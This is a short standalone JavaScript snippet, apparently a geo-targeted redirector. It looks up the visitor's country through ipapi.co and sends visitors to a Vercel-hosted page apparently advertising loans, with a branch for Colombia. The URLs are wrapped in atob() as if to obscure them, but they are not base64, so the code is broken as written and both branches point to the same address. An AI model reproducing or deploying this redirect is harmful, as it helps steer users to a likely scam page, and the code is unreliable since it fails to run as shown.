<script> 
(function(){
  const URL_CO  = atob("https://teprestanequi.vercel.app/index.php.html");
  const URL_OUT = atob("https://teprestanequi.vercel.app/index.php.html");

  fetch("https://ipapi.co/json/")
    .then(r => r.json())
    .then(d => {
      if (d.country === "CO") {
        window.location.href = URL_CO;
      } else {
        window.location.href = URL_OUT;
      }
    })
    .catch(() => {
      window.location.href = URL_OUT;
    });
})();
</script>
